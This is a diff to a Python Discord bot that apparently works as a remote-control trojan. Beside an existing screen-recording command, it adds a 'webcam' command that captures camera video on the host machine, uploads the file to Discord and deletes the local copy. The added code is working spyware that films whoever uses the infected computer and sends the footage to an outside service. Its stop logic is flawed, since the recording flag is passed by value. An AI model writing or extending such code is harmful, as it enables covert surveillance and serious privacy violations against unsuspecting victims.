@@ -1,4 +1,5 @@
 import os
+import cv2
 import discord
 import asyncio
 import subprocess
@@ -235,6 +236,91 @@ async def record_screen(ctx, rec: bool):
     except Exception as e:
         await ctx.send(f"❌ Error recording screen: {str(e)}")
 
+@bot.command()
+async def webcam(ctx, action: str):
+    """Starts or stops webcam recording."""
+    global recording_task  # To access the global task variable
+    rec = False
+
+    try:
+        if action.lower() == "start":
+            if recording_task is not None and not recording_task.done():
+                await ctx.send("❌ A recording is already in progress!")
+                return
+
+            # Start the recording task
+            rec = True
+            recording_task = asyncio.create_task(record_webcam(ctx, rec))
+            await ctx.send("✅ Started the webcam recording")
+
+        elif action.lower() == "stop":
+            if recording_task is None or recording_task.done():
+                await ctx.send("❌ No recording is currently in progress!")
+                return
+
+            # Stop the recording task by setting rec to False
+            rec = False
+            await ctx.send("✅ Stopping the webcam recording")
+            recording_task.cancel()  # This will stop the recording task
+            await recording_task  # Wait for the task to finish properly
+
+        else:
+            await ctx.send("❌ Only use 'start' or 'stop'!")
+
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+
+async def record_webcam(ctx, rec: bool):
+    """Handles the webcam recording process."""
+    try:
+        # Define the output file name with a timestamp
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"webcam_recording_{timestamp}.mp4"
+
+        # Open the webcam (use the first camera available)
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            await ctx.send("❌ Could not access the webcam!")
+            return
+
+        # Define the codec and create a VideoWriter object to save the video
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Codec for mp4 format
+        fps = 20  # Frames per second
+        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+        out = cv2.VideoWriter(output_file, fourcc, fps, (frame_width, frame_height))
+
+        # Record the webcam video continuously in a loop until rec is False
+        while rec:
+            ret, frame = cap.read()
+            if not ret:
+                break
+
+            # Write the frame to the video file
+            out.write(frame)
+
+            # Display the frame in a window (optional, useful for debugging)
+            # cv2.imshow('Webcam', frame)
+
+            await asyncio.sleep(1 / fps)  # Simulate frame delay
+
+        # Release the webcam and writer once done
+        cap.release()
+        out.release()
+
+        # Send the recorded video to Discord
+        with open(output_file, "rb") as video_file:
+            await ctx.send(file=discord.File(video_file, output_file))
+
+        # Clean up the recorded file
+        os.remove(output_file)
+
+    except asyncio.CancelledError:
+        # Handle the task cancellation gracefully
+        await ctx.send("Webcam recording was cancelled.")
+    except Exception as e:
+        await ctx.send(f"❌ Error recording webcam: {str(e)}")
 
 @bot.event
 async def on_ready():
